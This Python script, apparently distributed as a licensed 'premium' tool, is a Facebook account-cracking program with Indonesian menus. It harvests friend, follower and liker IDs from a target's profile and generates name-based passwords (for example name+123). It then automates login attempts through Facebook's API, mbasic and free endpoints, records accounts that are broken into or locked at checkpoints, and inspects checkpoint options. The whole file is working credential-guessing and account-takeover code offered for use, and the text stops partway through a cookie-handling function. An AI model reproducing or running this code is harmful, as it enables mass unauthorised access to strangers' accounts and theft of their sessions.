#!/usr/bin/python3 
#-*-coding:utf-8-*- 
#Create By Aang Ardiansyah-XD
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote
P = "\x1b[0;97m" # Putih
M = "\x1b[0;91m" # Merah
H = "\x1b[0;92m" # Hijau
K = "\x1b[0;93m" # Kuning
B = "\x1b[0;94m" # Biru
U = "\x1b[0;95m" # Ungu
O = "\x1b[0;96m" # Biru Muda
N = "\033[0m"    # Warna Mati
url_license = 'https://ngepetonline.000webhostapp.com/chek.php?project=premiumdapunta&apikey='
host = "https://mbasic.facebook.com"
ok = []
cp = []
ttl = []
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]
tanggal = ("%s-%s-%s"%(ha,op,ta))
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537;]'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def clear():
    if "linux" in sys.platform.lower():os.system("clear")
    elif "win" in sys.platform.lower():os.system("cls")
    else:os.system("clear")
def banner():
    print("""\x1b[0;92m        ____ _____ __  _______________
\x1b[0;92m       / —  )  _  ) / / /_  __/_  /  /
\x1b[0;92m      / _  <  _  / /_/ / / /  _   / /__
\x1b[0;92m     /_____/_/ \_\____/ /_/__//__/____/
\x1b[0;97m#--------------------------------------------#
\x1b[0;97m•\x1b[0;97m Author   : \x1b[0;93mAang Ardiansyah-XD
\x1b[0;97m•\x1b[0;97m Facebook : \x1b[0;93mSaya Aang \x1b[0;97m& \x1b[0;93mWhy Aang Ardiansyah
\x1b[0;97m•\x1b[0;97m Github   : \x1b[0;93mGithub.com/AngCyber
\x1b[0;97m#--------------------------------------------#
""")
def menu_log():
    os.system('rm -rf token.txt')
    clear()
    banner()
    var_menu()
    pmu = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
    print('')
    if pmu in ['']:
        jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P))
        menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        token = input('%s[%s?%s] %sToken : '%(K,P,K,P))
        try:
            x = requests.get("https://graph.facebook.com/me?access_token=" + token)
            y = json.loads(x.text)
            n = y['name']
            xd = open("token.txt", "w")
            xd.write(token)
            xd.close()
            jalan('\n%s[%s✓%s] %sLogin Berhasil Ngab.....'%(K,H,K,P))
            #exit(bot_follow_prem2.main())
            menu()
        except (KeyError,IOError):
            jalan('\n%s[%s!%s] %sToken Nya Invalid Kentod !!'%(M,P,M,M))
            os.system('rm -rf token.txt')
            menu_log()
        except requests.exceptions.ConnectionError:
            jalan('\n%s[%s!%s] %sConnection Error'%(M,P,M,P))
            exit()
    elif pmu in ['2','02','002','b']:
        defaultua()
        cookie = input('%s[%s?%s] %sCookies : '%(K,P,K,P))
        try:
            data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
            "user-agent"                : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109", # Jangan Di Ganti Ea Anjink.
            "referer"                   : "https://m.facebook.com/",
            "host"                      : "m.facebook.com",
            "origin"                    : "https://m.facebook.com",
            "upgrade-insecure-requests" : "1",
            "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control"             : "max-age=0",
            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type"              : "text/html; charset=utf-8"
            }, cookies = {
            "cookie"                    : cookie
            })
            find_token = re.search("(EAAA\w+)", data.text)
            hasil = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
            xd = open("token.txt", "w")
            xd.write(find_token.group(1))
            xd.close()
            #jalan('\n%s[%s!%s] %sLogin Successful'%(K,P,K,P))
            menu()
        except requests.exceptions.ConnectionError:
            jalan('\n%s[%s!%s] %sConnection Error'%(M,P,M,P))
            exit()
        except (KeyError,IOError,AttributeError):
            jalan('\n%s[%s!%s] %sCookies Nya Invalid Kentod !!'%(M,P,M,M))
            os.system('rm -rf token.txt')
            menu_log()
    elif pmu in ['3','03','003','c']:
        clear()
        banner()
        var_tutor()
        pf = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
        print('')
        if pf in ['']:
            jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P))
            menu_log()
        elif pf in ['1','01','001','a']:
            os.system('xdg-open https://youtu.be/iDVCcnLcTnE')
            input('%s[ %Kembali %s]%s'%(K,P,K,P))
            menu_log()
        elif pf in ['2','02','002','b']:
            os.system('xdg-open https://youtu.be/iDVCcnLcTnE')
            input('%s[ %sKembali %s]%s'%(K,P,K,P))
            menu_log()
        elif pf in ['3','03','003','c']:
            os.system('xdg-open https://youtu.be/9snR31AI_h8')
            input('%s[ %sKembali %s]%s'%(K,P,K,P))
            menu_log()
        elif pf in ['4','04','004','d']:
            tutor_crack()
            input('%s[ %sKembali %s]%s'%(K,P,K,P))
            menu_log()
        else:
            jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
            menu_log()
    elif pmu in ['4','04','004','d']:
        clear()
        banner()
        var_author()
        input('%s[ %sKembali %s]%s'%(K,P,K,H))
        menu_log()
    elif pmu in ['0','00','000','e']:
        jalan('%s[%s!%s] %sTerimakasih Telah Menggunakan Sc Ini'%(K,P,K,P))
        jalan('%s[%s!%s] %sSemoga Harimu Suram....\n'%(K,P,K,P))
        os.system('rm -rf token.txt')
        clear()
        exit()
    else:
        jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P))
        menu_log()
def menu():
    clear()
    banner()
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        kun = lisensi.split('-')
        users = wk['username']
        bergabung = wk['joined']
        kadaluarsa = wk['expired']
        status = ('%sPremium [%sPro%s]'%(K,H,K))
        kunci = ('%s%s%s-%s%s%s-%sXXXXX'%(K,kun[0],P,K,kun[1],P,K))
        pro = ''
        upgrade = 'Change License Key'
        jid = ''
    except (KeyError,IOError):
        status = '\x1b[0;92mFree Dari Aang'
        users = '-'
        kunci = 'Aq5g-72p3-hRn12'
        bergabung = '-'
        kadaluarsa = '30-Desember-2030'
        pro = ("%s[%sPro%s]"%(K,P,K))
        upgrade = ('Upgrade To %sPro'%(K))
        jid = ('%s[%s5000 ID%s]'%(K,P,K))
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
        i = y['id']
    except (KeyError,IOError):
        print('%s'%(M))
        jalan('%s[%s!%s] %sToken/Cookies Invalid Ngab'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        print('%s'%(M))
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    a = requests.get("http://ip-api.com/json/",headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Mobile; Windows Phone 8.1; Android 4.0; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 635) like iPhone OS 7_0_3 Mac OS X AppleWebKit/537 (KHTML, like Gecko) Mobile Safari/537"}).json()
    try:
        ip = a["query"]
    except KeyError:
        ip = " "
    print('%s[ %sSelamat Datang %s %s ]\n'%(K,H,n,K))
    print('%s[%s•%s] %sYou ID : %s'%(K,P,K,P,i))
    print('%s[%s•%s] %sYou IP : %s'%(K,P,K,P,ip))
    print('%s[%s•%s] %sStatus : %s'%(K,P,K,P,status))
    print('%s[%s•%s] %sKey    : %s'%(K,P,K,P,kunci))
    #print('%s[%s•%s] %sKedaluarsa : %s'%(K,P,K,K,kadaluarsa))
    print('\n%s[%s1%s] %sCrack ID Dari Teman Publik %s'%(K,P,K,P,jid))
    print('%s[%s2%s] %sCrack ID Dari Followers %s'%(K,P,K,P,jid))
    print('%s[%s3%s] %sCrack ID Dari Like Postingan %s'%(K,P,K,P,jid))
    print('%s[%s4%s] %sAmbil Data Akun Facebook'%(K,P,K,P))
    print('%s[%s5%s] %sDump Jumlah Teman %s'%(K,P,K,P,pro))
    print('%s[%s6%s] %sLihat Hasil Crack Saya'%(K,P,K,P))
    print('%s[%s7%s] %sCek Opsi Hasil Crack %s'%(K,P,K,P,pro))
    print('%s[%s8%s] %sSetting User Agent'%(K,P,K,P))
    print('%s[%s0%s] %sKeluar [Ahh Ngecrot]'%(K,P,K,M))
    pm = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
    print('')
    if pm in ['']:
        jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P))
        menu()
    elif pm in ['1','01','001','a']:
        publik()
    elif pm in ['2','02','002','b']:
        pengikut()
    elif pm in ['3','03','003','c']:
        likers()
    elif pm in ['4','04','004','d']:
        target()
    elif pm in ['5','05','005','e']:
        teman_target()
    elif pm in ['6','06','006','f']:
        hasil()
    elif pm in ['7','07','007','g']:
        cek_hasil()
    elif pm in ['8','08','008','h']:
        ugen()
    elif pm in ['9','09','009','i']:
        buy_license()
    elif pm in ['0','00','000','j']:
        jalan('%s[%s!%s] %sTerimakasih Telah Menggunakan Sc Ini'%(K,P,K,H))
        jalan('%s[%s!%s] %sSemoga Harimu Suram (:'%(K,P,K,H))
        os.system('rm -rf token.txt')
        menu_log()
    else:
        jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P))
        menu()
def defaultua():
    ua = ua_xiaomi
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError,IOError):
        menu_log()
def ugen():
    var_ugen()
    pmu = input('%s[%s•%s] %sPilih : '%(K,P,K,K))
    print('')
    if pmu in[""]:
        jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P))
        menu()
    elif pmu in ['1','01','001','a']:
        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        input('%s[ %sBack %s]%s'%(K,P,K,P))
        menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt")
        ua = input("%s[%s?%s] %sMasukan User Agent : \n\n"%(K,P,K,P))
        try:
            ugent = open('ugent.txt','w')
            ugent.write(ua)
            ugent.close()
            jalan("\n%s[ %sBerhasil Mengganti User Agent %s]"%(K,H,K))
            input('\n%s[ %sKembali %s]%s'%(K,P,K,P))
            menu()
        except (KeyError,IOError):
            jalan("\n%s[ %sGagal Mengganti User Agent %s]"%(K,M,K))
            print('%s'%(M))
            input('%s[ %sKembali %s]%s'%(M,P,M,P))
            menu()
    elif pmu in ['3','03','003','c']:
        ugen_hp()
    elif pmu in ['4','04','004','d']:
        os.system("rm -rf ugent.txt")
        jalan("%s[ %sBerhasil Menghapus User Agent %s]"%(K,H,K))
        input('\n%s[ %sKembali %s]%s'%(K,P,K,P))
        menu()
    elif pmu in ['5','05','005','e']:
        try:
            ungser = open('ugent.txt', 'r').read()
        except (KeyError,IOError):
            ungser = 'Not Found'
        print("%s[%s•%s] %sUser Agent : \n\n%s%s"%(K,P,K,P,K,ungser))
        jalan("\n%s[ %sUser Agent Kamu Saat Ini %s]"%(K,P,K))
        input('\n%s[ %sKembali %s]%s'%(K,P,K,P))
        menu()
    elif pmu in ['0','00','000','f']:
        menu()
    else:
        jalan('%s[%s!%s] %sFill In The Correct'%(M,P,M,P))
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print('%s[%s1%s] %sXiaomi'%(K,P,K,P))
    print('%s[%s2%s] %sNokia'%(K,P,K,P))
    print('%s[%s3%s] %sAsus'%(K,P,K,P))
    print('%s[%s4%s] %sHuawei'%(K,P,K,P))
    print('%s[%s5%s] %sVivo'%(K,P,K,P))
    print('%s[%s6%s] %sOppo'%(K,P,K,P))
    print('%s[%s7%s] %sSamsung'%(K,P,K,P))
    print('%s[%s8%s] %sWindows'%(K,P,K,P))
    pc = input('%s[%s•%s] %sPilih : '%(K,P,K,P))
    print('')
    if pc in['']:jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P));menu()
    elif pc in ['1','01']:
        ugent = open('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:
        ugent = open('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:
        ugent = open('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:
        ugent = open('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:
        ugent = open('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:
        ugent = open('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:
        ugent = open('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:
        ugent = open('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    else:jalan('%s[%s!%s] %sYang Bener Lah Kentod'%(M,P,M,P));menu()
    jalan("%s[ %sBerhasil Mengganti User Agent %s]"%(K,H,K))
    input('\n%s[ %sKembali %s]%s'%(K,P,K,K))
    menu()
def publik():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '5000'
    except (KeyError,IOError):
        jid = '5000'
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        print('%s[%s•%s] %sKetik \'me\' Untuk Crack Teman Sendiri'%(K,P,K,K))
        it = input("%s[%s?%s] %sID Target : "%(K,P,K,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s[%s•%s] %sNama : %s'%(K,P,K,P,ob['name']))
        except (KeyError,IOError):
            jalan('\n%s[%s!%s] %sID Nya Privat Bangke!!'%(M,P,M,M))
            menu()
        r = requests.get("https://graph.facebook.com/%s/friends?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s[%s•%s] %sTotal ID : %s'%(K,P,K,P,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s[%s!%s] %sEror : %s'%(M,P,M,P,e))
def pengikut():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '10000'
    except (KeyError,IOError):
        jid = '10000'
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        print('%s[%s•%s] %sKetik \'me\' Untuk Crack Followers Sendiri'%(K,P,K,K))
        it = input("%s[%s?%s] %sID Target : "%(K,P,K,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s[%s•%s] %sNama : %s'%(K,P,K,P,ob['name']))
        except (KeyError,IOError):
            jalan('\n%s[%s!%s] %sID Nya Privat Bangke!!'%(M,P,M,M))
            menu()
        r = requests.get("https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s[%s•%s] %sTotal ID : %s'%(K,P,K,P,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s[%s!%s] %sError : %s'%(M,P,M,P,e))
def likers():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '10000'
    except (KeyError,IOError):
        jid = '10000'
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s[%s!%s] %sConnection Error'%(M,P,M,P))
        exit()
    try:
        print('%s[%s•%s] %sKetik \'me\' Untuk Crack Like Post Sendiri'%(K,P,K,K))
        it = input("%s[%s?%s] %sID Target : "%(K,P,K,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s[%s•%s] %sNama : %s'%(K,P,K,K,ob['name']))
        except (KeyError,IOError):
            jalan('\n%s[%s!%s] %sID Nya Privat Bangke!!'%(M,P,M,M))
            menu()
        r = requests.get("https://graph.facebook.com/%s/likes?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s[%s•%s] %sTotal ID : %s'%(K,P,K,P,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s[%s!%s] %sError : %s'%(M,P,M,P,e))
def pass_dev(_cici_):
    _dapunta_=[]
    ps = open('pass.txt','r').read()
    pp = open('passangka.txt','r').read()
    for i in _cici_.split(" "):  
        i=i.lower()
        if len(i)<3:
            continue
        elif len(i)==3 or len(i)==4 or len(i)==5:
            _dapunta_.append(i+"123")
            _dapunta_.append(i+"12345")
            _dapunta_.append(i+"234")
            _dapunta_.append(i+"kontol")
            _dapunta_.append(i+"sayang")
        else:
            _dapunta_.append(i)
            _dapunta_.append(i+"123")
            _dapunta_.append(i+"12345")
            _dapunta_.append(i+"234")
    if pp in ['',' ','  ']:pass
    else:
        for i in _cici_.split(" "):  
            i=i.lower()
            for x in pp.split(','):
                _dapunta_.append(i+x)
    if ps in ['',' ','  ']:pass
    else:
        for z in ps.split(','):
            _dapunta_.append(z)
    _dapunta_.append(_cici_.lower())
    return _dapunta_
def tambah_pass():
    print('%s[%s Setel Password %s]\n'%(K,K,K))
    print('%s[%s•%s] %sContoh : sayang,bismillah,123456'%(K,P,K,P))
    cuy = input('%s[%s?%s] %sMasukan Pass Tambahan [1 Kata] : '%(K,P,K,P))
    gh = open('pass.txt','w')
    gh.write(cuy)
    gh.close
def tambah_pass_angka():
    print('\n%s[%s•%s] %sContoh : 321,786,gaming,ganteng'%(K,P,K,P))
    coy = input('%s[%s?%s] %sMasukan Pass Dibelakang Nama : '%(K,P,K,P))
    xy = open('passangka.txt','w')
    xy.write(coy)
    xy.close
def log_api(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
        'format': 'json', 
        'sdk_version': '2', 
        'email': em, 
        'locale': 'en_US', 
        'password': pas, 
        'sdk': 'ios', 
        'generate_session_cookies': '1', 
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def log_free(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://free.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def cek_log(user, pasw, h_cp):
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109"
    mb = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": mb,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": mb+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("[!] Redirect Overload")
    if "c_user" in ses.cookies:
        return {"status":"error","email":user,"pass":pasw}
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        opsi=[]
        option_dev = []
        for opt in range(len(ngew)):
            option_dev.append("\n     "+P+str(opt+1)+". "+ngew[opt]+" ")
        print(h_cp+"".join(option_dev))
    elif "login_error" in str(run):
        pass
    else:
        pass
def koki(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
    sample = "".join(result)
    sam_   = sample.replace(' ','')
